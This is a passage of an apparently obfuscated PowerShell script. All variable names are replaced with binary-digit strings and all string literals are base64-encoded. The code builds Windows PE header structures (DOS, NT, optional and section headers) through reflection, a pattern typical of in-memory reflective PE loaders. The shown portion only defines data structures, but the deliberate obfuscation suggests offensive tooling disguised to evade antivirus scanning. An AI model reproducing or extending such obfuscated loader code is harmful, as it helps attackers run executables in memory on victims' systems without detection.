      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBvAHUAbgBkAEkAbQBwAG8AcgB0AA=='))), ${01110100100000010}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(200) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAFQA'))), ${01110100100000010}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(208) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AEkAbQBwAG8AcgB0AEQAZQBzAGMAcgBpAHAAdABvAHIA'))), ${01110100100000010}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(216) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBMAFIAUgB1AG4AdABpAG0AZQBIAGUAYQBkAGUAcgA='))), ${01110100100000010}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(224) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))), ${01110100100000010}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(232) | Out-Null
      ${11000000101100010} = ${00111011010110110}.CreateType()
      $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value ${11000000101100010}
      ${10010100001010100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAEUAeABwAGwAaQBjAGkAdABMAGEAeQBvAHUAdAAsACAAUwBlAGEAbABlAGQALAAgAEIAZQBmAG8AcgBlAEYAaQBlAGwAZABJAG4AaQB0AA==')))
      ${00111011010110110} = ${10100010010101101}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATwBQAFQASQBPAE4AQQBMAF8ASABFAEEARABFAFIAMwAyAA=='))), ${10010100001010100}, [System.ValueType], 224)
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGcAaQBjAA=='))), ${01011110101101000}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAEwAaQBuAGsAZQByAFYAZQByAHMAaQBvAG4A'))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(2) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAEwAaQBuAGsAZQByAFYAZQByAHMAaQBvAG4A'))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(3) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAQwBvAGQAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(4) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBuAGkAdABpAGEAbABpAHoAZQBkAEQAYQB0AGEA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(8) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAVQBuAGkAbgBpAHQAaQBhAGwAaQB6AGUAZABEAGEAdABhAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(12) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYARQBuAHQAcgB5AFAAbwBpAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(16) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBPAGYAQwBvAGQAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(20) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBPAGYARABhAHQAYQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(24) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAGEAZwBlAEIAYQBzAGUA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(28) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdABpAG8AbgBBAGwAaQBnAG4AbQBlAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(32) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBBAGwAaQBnAG4AbQBlAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(36) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(40) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(42) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAEkAbQBhAGcAZQBWAGUAcgBzAGkAbwBuAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(44) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAEkAbQBhAGcAZQBWAGUAcgBzAGkAbwBuAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(46) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAFMAdQBiAHMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(48) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAFMAdQBiAHMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(50) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AMwAyAFYAZQByAHMAaQBvAG4AVgBhAGwAdQBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(52) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBtAGEAZwBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(56) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAZABlAHIAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(60) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGUAYwBrAFMAdQBtAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(64) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AGIAcwB5AHMAdABlAG0A'))), ${01001011001001010}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(68) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABsAGwAQwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), ${00010000000110011}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(70) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUwB0AGEAYwBrAFIAZQBzAGUAcgB2AGUA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(72) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUwB0AGEAYwBrAEMAbwBtAG0AaQB0AA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(76) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAcABSAGUAcwBlAHIAdgBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(80) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAcABDAG8AbQBtAGkAdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(84) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABlAHIARgBsAGEAZwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(88) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFIAdgBhAEEAbgBkAFMAaQB6AGUAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(92) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbwByAHQAVABhAGIAbABlAA=='))), ${01110100100000010}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(96) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAbwByAHQAVABhAGIAbABlAA=='))), ${01110100100000010}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(104) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAbwB1AHIAYwBlAFQAYQBiAGwAZQA='))), ${01110100100000010}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(112) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGMAZQBwAHQAaQBvAG4AVABhAGIAbABlAA=='))), ${01110100100000010}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(120) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBlAHIAdABpAGYAaQBjAGEAdABlAFQAYQBiAGwAZQA='))), ${01110100100000010}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(128) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBSAGUAbABvAGMAYQB0AGkAbwBuAFQAYQBiAGwAZQA='))), ${01110100100000010}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(136) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA=='))), ${01110100100000010}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(144) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQByAGMAaABpAHQAZQBjAHQAdQByAGUA'))), ${01110100100000010}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(152) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBsAG8AYgBhAGwAUAB0AHIA'))), ${01110100100000010}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(160) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABMAFMAVABhAGIAbABlAA=='))), ${01110100100000010}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(168) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABDAG8AbgBmAGkAZwBUAGEAYgBsAGUA'))), ${01110100100000010}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(176) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBvAHUAbgBkAEkAbQBwAG8AcgB0AA=='))), ${01110100100000010}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(184) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAFQA'))), ${01110100100000010}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(192) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AEkAbQBwAG8AcgB0AEQAZQBzAGMAcgBpAHAAdABvAHIA'))), ${01110100100000010}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(200) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBMAFIAUgB1AG4AdABpAG0AZQBIAGUAYQBkAGUAcgA='))), ${01110100100000010}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(208) | Out-Null
      (${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))), ${01110100100000010}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(216) | Out-Null
      ${00110101101011100} = ${00111011010110110}.CreateType()
      $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value ${00110101101011100}
      ${10010100001010100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
      ${00111011010110110} = ${10100010010101101}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ASABFAEEARABFAFIAUwA2ADQA'))), ${10010100001010100}, [System.ValueType], 264)
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBIAGUAYQBkAGUAcgA='))), ${00110000001011111}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAHQAaQBvAG4AYQBsAEgAZQBhAGQAZQByAA=='))), ${11000000101100010}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${01010110011100000} = ${00111011010110110}.CreateType()
      $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value ${01010110011100000}
      ${10010100001010100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
      ${00111011010110110} = ${10100010010101101}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ASABFAEEARABFAFIAUwAzADIA'))), ${10010100001010100}, [System.ValueType], 248)
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBIAGUAYQBkAGUAcgA='))), ${00110000001011111}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAHQAaQBvAG4AYQBsAEgAZQBhAGQAZQByAA=='))), ${00110101101011100}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${01001100100110001} = ${00111011010110110}.CreateType()
      $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value ${01001100100110001}
      ${10010100001010100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
      ${00111011010110110} = ${10100010010101101}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABPAFMAXwBIAEUAQQBEAEUAUgA='))), ${10010100001010100}, [System.ValueType], 64)
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG0AYQBnAGkAYwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAYgBsAHAA'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcAA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcgBsAGMA'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcABhAHIAaABkAHIA'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG0AaQBuAGEAbABsAG8AYwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG0AYQB4AGEAbABsAG8AYwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAHMAcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAHMAcAA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcwB1AG0A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGkAcAA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGwAZgBhAHIAbABjAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG8AdgBuAG8A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${01001010110100110} = ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAHIAZQBzAA=='))), [UInt16[]], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEgAYQBzAEYAaQBlAGwAZABNAGEAcgBzAGgAYQBsAA=='))))
      ${01010100000001010} = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
      ${10111110101111010} = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBDAG8AbgBzAHQA')))))
      ${10110000110000100} = New-Object System.Reflection.Emit.CustomAttributeBuilder(${10111100000010110}, ${01010100000001010}, ${10111110101111010}, @([Int32] 4))
      ${01001010110100110}.SetCustomAttribute(${10110000110000100})
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG8AZQBtAGkAZAA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG8AZQBtAGkAbgBmAG8A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${10011010111011001} = ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAHIAZQBzADIA'))), [UInt16[]], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEgAYQBzAEYAaQBlAGwAZABNAGEAcgBzAGgAYQBsAA=='))))
      ${01010100000001010} = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
      ${10110000110000100} = New-Object System.Reflection.Emit.CustomAttributeBuilder(${10111100000010110}, ${01010100000001010}, ${10111110101111010}, @([Int32] 10))
      ${10011010111011001}.SetCustomAttribute(${10110000110000100})
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGwAZgBhAG4AZQB3AA=='))), [Int32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${10001110011101100} = ${00111011010110110}.CreateType()	
      $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value ${10001110011101100}
      ${10010100001010100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
      ${00111011010110110} = ${10100010010101101}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBFAEMAVABJAE8ATgBfAEgARQBBAEQARQBSAA=='))), ${10010100001010100}, [System.ValueType], 40)
      ${01000000000100101} = ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA='))), [Char[]], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEgAYQBzAEYAaQBlAGwAZABNAGEAcgBzAGgAYQBsAA=='))))
      ${01010100000001010} = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
      ${10110000110000100} = New-Object System.Reflection.Emit.CustomAttributeBuilder(${10111100000010110}, ${01010100000001010}, ${10111110101111010}, @([Int32] 8))
      ${01000000000100101}.SetCustomAttribute(${10110000110000100})
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABTAGkAegBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
      ${00111011010110110}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABBAGQAZAByAGUAcwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
